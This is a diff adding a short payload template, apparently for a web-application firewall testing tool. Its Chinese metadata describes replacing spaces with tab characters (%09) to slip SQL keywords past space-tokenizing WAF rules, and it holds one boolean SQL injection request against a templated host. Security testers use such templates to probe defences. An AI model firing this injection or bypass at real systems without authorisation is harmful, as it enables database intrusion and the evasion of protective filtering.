@@ -1,0 +1,13 @@
+# @name: 制表符%09替代空格
+# @tags: get,sqli,whitespace,tab,id,bypass
+# @color: pink
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: replace_space
+# @intent.replace_from: " "
+# @intent.replace_to: %09
+# @note: 用水平制表符 %09 替代空格，绕过仅按空格分词的 WAF 关键字规则。SQLMap space2tab 思路。
+GET /?id=1'%09and%09'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
